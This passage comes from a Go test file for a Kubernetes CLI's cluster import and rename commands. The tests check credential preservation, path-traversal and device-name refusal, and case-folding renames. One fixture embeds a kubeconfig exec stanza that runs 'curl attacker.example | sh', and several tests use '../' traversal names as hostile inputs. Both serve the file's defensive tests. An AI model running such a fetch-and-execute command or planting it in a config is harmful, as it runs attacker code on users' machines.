	content, readErr := os.ReadFile(path)
	require.NoError(t, readErr)
	assert.Equal(t, adminCertKubeconfig, string(content), "the credential survives the refused import")

	cfg, loadErr := config.Load()
	require.NoError(t, loadErr)
	assert.Nil(t, cfg.GetCluster("shop"), "a refused import writes no entry either")
}

// Re-importing an updated export is the ordinary way to pick up a changed
// domain, and the file it replaces there carries no credential at all.
func TestClusterAddReplacesItsOwnCredentialFreeKubeconfig(t *testing.T) {
	home := withFakeHome(t)
	path := stageExistingKubeconfig(t, home, kipRenderedKubeconfig(t, "https://198.51.100.9:6443"))

	require.NoError(t, runClusterAdd(clusterAddCmd, []string{exportBundle(t, home)}))

	content, err := os.ReadFile(path)
	require.NoError(t, err)
	assert.Contains(t, string(content), "203.0.113.10", "the import's server address lands")
	assert.NotContains(t, string(content), "198.51.100.9")
}

// Another tool's plugin holds a credential kip never issued and cannot reissue,
// so it is no more replaceable than a certificate.
func TestClusterAddKeepsAnotherToolsCredentialPlugin(t *testing.T) {
	home := withFakeHome(t)
	foreign := `apiVersion: v1
kind: Config
clusters:
- name: shop
  cluster: {server: "https://203.0.113.10:6443", certificate-authority-data: Y2EtcGVt}
users:
- name: eks
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1beta1
      command: aws
      args: ["eks", "get-token", "--cluster-name", "shop"]
contexts:
- name: shop
  context: {cluster: shop, user: eks}
current-context: shop
`
	path := stageExistingKubeconfig(t, home, foreign)

	err := runClusterAdd(clusterAddCmd, []string{exportBundle(t, home)})

	require.Error(t, err)
	content, readErr := os.ReadFile(path)
	require.NoError(t, readErr)
	assert.Equal(t, foreign, string(content))
}

// An export is a file someone sent you, and its name becomes a path under
// ~/.kip/clusters. A name carrying a parent reference would put the file
// wherever its author chose.
func TestClusterAddRefusesANameThatIsAPath(t *testing.T) {
	home := withFakeHome(t)

	// An empty name is refused earlier, by the export's own completeness check.
	for _, name := range []string{"../escaped", "sub/dir", "..", ".hidden"} {
		bundle := filepath.Join(home, "export.yaml")
		body, err := os.ReadFile(exportBundle(t, home))
		require.NoError(t, err)
		//nolint:gosec // G703: bundle is a fixed path inside the test's temp home
		require.NoError(t, os.WriteFile(bundle,
			[]byte(strings.Replace(string(body), "name: shop", "name: "+name, 1)), 0o600))

		err = runClusterAdd(clusterAddCmd, []string{bundle})
		require.Error(t, err, "name %q must be refused", name)
		assert.Contains(t, err.Error(), "not usable")
	}

	_, err := os.Stat(filepath.Join(filepath.Dir(home), "escaped.yaml"))
	assert.True(t, errors.Is(err, os.ErrNotExist), "nothing may be written outside the clusters directory")
}

// A refresh token in auth-provider config, or a basic-auth password, is a
// credential like any other. Reading only certificates and tokens meant an
// import replaced these as if the file were empty.
func TestClusterAddKeepsCredentialsThatAreNotCertificates(t *testing.T) {
	for name, users := range map[string]string{
		"basic auth": `- name: shop
  user: {username: admin, password: hunter2}`,
		"auth provider": `- name: shop
  user:
    auth-provider:
      name: oidc
      config: {refresh-token: r3fr3sh, idp-issuer-url: "https://issuer.example"}`,
	} {
		t.Run(name, func(t *testing.T) {
			home := withFakeHome(t)
			content := `apiVersion: v1
kind: Config
clusters:
- name: shop
  cluster: {server: "https://203.0.113.10:6443", certificate-authority-data: Y2EtcGVt}
users:
` + users + `
contexts:
- name: shop
  context: {cluster: shop, user: shop}
current-context: shop
`
			path := stageExistingKubeconfig(t, home, content)

			err := runClusterAdd(clusterAddCmd, []string{exportBundle(t, home)})

			require.Error(t, err)
			after, readErr := os.ReadFile(path)
			require.NoError(t, readErr)
			assert.Equal(t, content, string(after))
		})
	}
}

// The same blind spot on the way in: an export carrying one of these was
// accepted as credential-free, against that check's own contract.
func TestRejectEmbeddedCredentialCoversEveryCredentialForm(t *testing.T) {
	//nolint:gosec // G101: invented values in a fixture, not a credential
	for name, user := range map[string]string{
		"basic auth":    "  user: {username: admin, password: hunter2}",
		"auth provider": "  user:\n    auth-provider:\n      name: oidc",
		"token":         "  user: {token: abcdef}",
		"certificate":   "  user: {client-certificate-data: Y2VydA==}",
	} {
		t.Run(name, func(t *testing.T) {
			err := rejectEmbeddedCredential([]byte(`apiVersion: v1
kind: Config
users:
- name: someone
` + user + "\n"))
			assert.Error(t, err, "an export carrying %s is not credential-free", name)
		})
	}
}

// Two config entries over one file is one cluster's credentials answering for
// another, which is what "Shop" and "shop" are on a case-folding filesystem.
func TestClusterAddRefusesAPathAnotherClusterOwns(t *testing.T) {
	home := withFakeHome(t)
	clusters := filepath.Join(home, ".kip", "clusters")
	require.NoError(t, os.MkdirAll(clusters, 0o700))
	require.NoError(t, config.Save(&config.Config{
		Clusters: []config.Cluster{
			{Name: "SHOP", Domain: "other.example", Kubeconfig: filepath.Join(clusters, "shop.yaml")},
		},
	}))

	err := runClusterAdd(clusterAddCmd, []string{exportBundle(t, home)})

	require.Error(t, err)
	assert.Contains(t, err.Error(), "SHOP", "the refusal names the cluster that already owns the file")
}

func TestClusterAddRefusesAWindowsDeviceName(t *testing.T) {
	home := withFakeHome(t)
	body, err := os.ReadFile(exportBundle(t, home))
	require.NoError(t, err)
	bundle := filepath.Join(home, "con-export.yaml")
	//nolint:gosec // G703: bundle is a fixed path inside the test's temp home
	require.NoError(t, os.WriteFile(bundle,
		[]byte(strings.Replace(string(body), "name: shop", "name: CON", 1)), 0o600))

	err = runClusterAdd(clusterAddCmd, []string{bundle})
	require.Error(t, err)
	assert.Contains(t, err.Error(), "reserved device name")
}

// The name reaching a path is not only the import's problem: rename builds the
// same path from a name a caller supplies.
func TestClusterRenameRefusesANameThatIsAPath(t *testing.T) {
	home := withFakeHome(t)
	path := stageExistingKubeconfig(t, home, adminCertKubeconfig)
	require.NoError(t, config.Save(&config.Config{
		CurrentCluster: "shop",
		Clusters:       []config.Cluster{{Name: "shop", Domain: "shop.example", Kubeconfig: path}},
	}))

	err := runClusterRename(clusterRenameCmd, []string{"shop", "../../outside"})

	require.Error(t, err)
	assert.Contains(t, err.Error(), "not usable")
	_, statErr := os.Stat(path)
	assert.NoError(t, statErr, "the kubeconfig stays where it was")
	_, escaped := os.Stat(filepath.Join(filepath.Dir(home), "outside.yaml"))
	assert.True(t, errors.Is(escaped, os.ErrNotExist), "and nothing lands outside the managed directory")
}

// A kubeconfig is not only data: an exec stanza names a command client-go runs
// as soon as anything asks for credentials, and an import is a file a colleague
// sent you. Nothing executable from that file may reach the disk.
func TestClusterAddRendersItsOwnKubeconfigRatherThanTheOneItWasSent(t *testing.T) {
	home := withFakeHome(t)
	hostile := `apiVersion: v1
kind: Config
clusters:
- name: c
  cluster: {server: "https://203.0.113.10:6443", certificate-authority-data: Y2EtcGVt}
users:
- name: operator
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      command: sh
      args: ["-c", "curl attacker.example | sh"]
contexts:
- name: c
  context: {cluster: c, user: operator}
current-context: c
`
	bundle := filepath.Join(home, "hostile.kip")
	body := "name: shop\nprovider: baremetal\nhost: 203.0.113.10\ndomain: shop.example\nkubeconfig: |\n"
	encoded := base64.StdEncoding.EncodeToString([]byte(hostile))
	for i := 0; i < len(encoded); i += 76 {
		body += "  " + encoded[i:min(i+76, len(encoded))] + "\n"
	}
	//nolint:gosec // G703: bundle is a fixed path inside the test's temp home
	require.NoError(t, os.WriteFile(bundle, []byte(body), 0o600))

	require.NoError(t, runClusterAdd(clusterAddCmd, []string{bundle}))

	written, err := os.ReadFile(filepath.Join(home, ".kip", "clusters", "shop.yaml"))
	require.NoError(t, err)
	assert.NotContains(t, string(written), "attacker.example", "nothing the sender chose to run may land")
	assert.NotContains(t, string(written), "command: sh")

	// Asserted through the parser: what kip renders as its command depends on
	// whether kip is on PATH, and a test that reads the literal "kip" passes or
	// fails on the machine's PATH rather than on the code.
	parsed, err := clientcmd.Load(written)
	require.NoError(t, err)
	user := parsed.AuthInfos["oidc@shop.example"]
	require.NotNil(t, user)
	require.NotNil(t, user.Exec)
	assert.True(t, installer.IsExactlyKipExec(user), "what lands is the plugin kip renders")
	assert.Equal(t, []string{"auth", "kubectl-token", "--cluster-domain", "shop.example"}, user.Exec.Args)
	assert.Equal(t, "https://203.0.113.10:6443", parsed.Clusters["shop.example"].Server, "the server address is kept")
	assert.Equal(t, []byte("ca-pem"), parsed.Clusters["shop.example"].CertificateAuthorityData, "and the cluster authority")
}

// The import replaces the whole file, so a credential parked in a context
// nobody is using is lost exactly as completely as the one in front of it.
func TestClusterAddKeepsACredentialInAnInactiveContext(t *testing.T) {
	home := withFakeHome(t)
	// A kip-rendered file with a break-glass certificate parked beside it, in a
	// context nobody is using.
	content := kipRenderedKubeconfig(t, "https://203.0.113.10:6443") + `- name: breakglass
  user:
    client-certificate-data: Y2VydA==
    client-key-data: a2V5
`
	path := stageExistingKubeconfig(t, home, content)

	err := runClusterAdd(clusterAddCmd, []string{exportBundle(t, home)})

	require.Error(t, err)
	assert.Contains(t, err.Error(), "breakglass", "the refusal names the entry that would have been lost")
	after, readErr := os.ReadFile(path)
	require.NoError(t, readErr)
	assert.Equal(t, content, string(after))
}

func TestClusterAddRefusesADeviceNameWithAnExtension(t *testing.T) {
	home := withFakeHome(t)
	body, err := os.ReadFile(exportBundle(t, home))
	require.NoError(t, err)
	bundle := filepath.Join(home, "dev-export.yaml")
	//nolint:gosec // G703: bundle is a fixed path inside the test's temp home
	require.NoError(t, os.WriteFile(bundle,
		[]byte(strings.Replace(string(body), "name: shop", "name: CON.backup", 1)), 0o600))

	err = runClusterAdd(clusterAddCmd, []string{bundle})
	require.Error(t, err)
	assert.Contains(t, err.Error(), "reserved device name")
}

// The loose "looks like kip" test was enough to decide a stale pin. It is not
// enough to decide destruction: a wrapper named kip, extra arguments, or
// environment the operator added all authenticate someone, and an export
// reproduces none of them.
func TestClusterAddKeepsAPluginThatOnlyResemblesKips(t *testing.T) {
	for name, user := range map[string]string{
		"a wrapper elsewhere": `      command: /opt/company/kip
      args: ["auth", "kubectl-token", "--cluster-domain", "shop.example"]`,
		"extra arguments": `      command: kip
      args: ["auth", "kubectl-token", "--cluster-domain", "shop.example", "--profile", "work"]`,
		"operator environment": `      command: kip
      args: ["auth", "kubectl-token", "--cluster-domain", "shop.example"]
      env:
        - name: KIP_PROFILE
          value: work`,
	} {
		t.Run(name, func(t *testing.T) {
			home := withFakeHome(t)
			content := `apiVersion: v1
kind: Config
clusters:
- name: shop
  cluster: {server: "https://203.0.113.10:6443", certificate-authority-data: Y2EtcGVt}
users:
- name: oidc@shop.example
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      interactiveMode: Never
` + user + `
contexts:
- name: shop
  context: {cluster: shop, user: oidc@shop.example}
current-context: shop
`
			path := stageExistingKubeconfig(t, home, content)

			err := runClusterAdd(clusterAddCmd, []string{exportBundle(t, home)})

			require.Error(t, err)
			after, readErr := os.ReadFile(path)
			require.NoError(t, readErr)
			assert.Equal(t, content, string(after))
		})
	}
}

// macOS and Windows fold case, so Stat finds Shop.yaml when asked for
// shop.yaml. Reading that as a collision makes normalising a name impossible on
// the machines operators use.
func TestClusterRenameAllowsACaseOnlyChange(t *testing.T) {
	home := withFakeHome(t)
	clusters := filepath.Join(home, ".kip", "clusters")
	require.NoError(t, os.MkdirAll(clusters, 0o700))
	oldPath := filepath.Join(clusters, "Shop.yaml")
	require.NoError(t, os.WriteFile(oldPath, []byte(kipRenderedKubeconfig(t, "https://203.0.113.10:6443")), 0o600))

	newPath, err := renameKubeconfigFile(oldPath, "shop", "shop.example")

	require.NoError(t, err)
	assert.Equal(t, filepath.Join(clusters, "shop.yaml"), newPath)
}

// An older kip's file carries no secret, and telling the operator it holds a
// credential sends them looking for something that was never there.
func TestClusterAddSaysWhenAKipPluginIsSimplyUnfamiliar(t *testing.T) {
	home := withFakeHome(t)
	path := stageExistingKubeconfig(t, home, `apiVersion: v1
kind: Config
clusters:
- name: shop
  cluster: {server: "https://203.0.113.10:6443", certificate-authority-data: Y2EtcGVt}
users:
- name: oidc@shop.example
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1beta1
      command: kip
      args: ["auth", "kubectl-token", "--cluster-domain", "shop.example"]
contexts:
- name: shop
  context: {cluster: shop, user: oidc@shop.example}
current-context: shop
`)

	err := runClusterAdd(clusterAddCmd, []string{exportBundle(t, home)})

	require.Error(t, err)
	assert.Contains(t, err.Error(), "this build did not write")
	assert.NotContains(t, err.Error(), "an export cannot reissue")
	_, statErr := os.Stat(path)
	assert.NoError(t, statErr)
}

// Where the filesystem folds case, one rename does not change a name's case:
// both spellings are one directory entry, so Windows refuses and macOS reports
// success while leaving the old name on disk.
func TestClusterRenameActuallyChangesTheCaseOnDisk(t *testing.T) {
	home := withFakeHome(t)
	clusters := filepath.Join(home, ".kip", "clusters")
	require.NoError(t, os.MkdirAll(clusters, 0o700))
	oldPath := filepath.Join(clusters, "Shop.yaml")
	require.NoError(t, os.WriteFile(oldPath, []byte(kipRenderedKubeconfig(t, "https://203.0.113.10:6443")), 0o600))

	newPath, err := renameKubeconfigFile(oldPath, "shop", "shop.example")
	require.NoError(t, err)
	assert.Equal(t, filepath.Join(clusters, "shop.yaml"), newPath)

	// Read the directory rather than Stat the path: on a case-folding
	// filesystem Stat answers for either spelling, so it cannot tell whether
	// the rename did anything.
	entries, err := os.ReadDir(clusters)
	require.NoError(t, err)
	var names []string
	for _, e := range entries {
		names = append(names, e.Name())
	}
	assert.Contains(t, names, "shop.yaml")
	assert.NotContains(t, names, "Shop.yaml", "the old spelling is gone from the directory")
	assert.NotContains(t, names, "Shop.yaml.kipper-case", "and no staging name is left behind")
}

// Where the filesystem does not fold case, Shop.yaml and shop.yaml are two
// files, and a rename that skipped the collision check would destroy the second.
func TestClusterRenameStillRefusesARealCollision(t *testing.T) {
	home := withFakeHome(t)
	clusters := filepath.Join(home, ".kip", "clusters")
	require.NoError(t, os.MkdirAll(clusters, 0o700))
	oldPath := filepath.Join(clusters, "shop.yaml")
	other := filepath.Join(clusters, "warehouse.yaml")
	require.NoError(t, os.WriteFile(oldPath, []byte(kipRenderedKubeconfig(t, "https://203.0.113.10:6443")), 0o600))
	require.NoError(t, os.WriteFile(other, []byte("someone else's file\n"), 0o600))

	_, err := renameKubeconfigFile(oldPath, "warehouse", "shop.example")

	require.Error(t, err)
	content, readErr := os.ReadFile(other)
	require.NoError(t, readErr)
	assert.Equal(t, "someone else's file\n", string(content), "the file already there survives")
}

// The domain is the pin the credential plugin is asked for. A bundle without
// one produces a kubeconfig that authenticates against nothing, and the failure
// surfaces far from the import that caused it.
func TestClusterAddRefusesABundleWithNoDomain(t *testing.T) {
	home := withFakeHome(t)
	body, err := os.ReadFile(exportBundle(t, home))
	require.NoError(t, err)
	bundle := filepath.Join(home, "no-domain.kip")
	//nolint:gosec // G703: bundle is a fixed path inside the test's temp home
	require.NoError(t, os.WriteFile(bundle,
		[]byte(strings.Replace(string(body), "domain: shop.example\n", "", 1)), 0o600))

	err = runClusterAdd(clusterAddCmd, []string{bundle})

	require.Error(t, err)
	assert.Contains(t, err.Error(), "domain")
}

// os.Rename replaces whatever is at the destination, so a predictable staging
// name would destroy a file left by an earlier interrupted rename, in the
// directory holding every cluster's credentials.
func TestClusterRenameDoesNotClobberAStagingFile(t *testing.T) {
	home := withFakeHome(t)
	clusters := filepath.Join(home, ".kip", "clusters")
	require.NoError(t, os.MkdirAll(clusters, 0o700))
	oldPath := filepath.Join(clusters, "Shop.yaml")
	require.NoError(t, os.WriteFile(oldPath, []byte(kipRenderedKubeconfig(t, "https://203.0.113.10:6443")), 0o600))
	leftover := oldPath + ".kipper-case"
	require.NoError(t, os.WriteFile(leftover, []byte("someone else's file\n"), 0o600))

	_, err := renameKubeconfigFile(oldPath, "shop", "shop.example")
	require.NoError(t, err)

	content, readErr := os.ReadFile(leftover)
	require.NoError(t, readErr, "the file already at the predictable staging name survives")
	assert.Equal(t, "someone else's file\n", string(content))
}
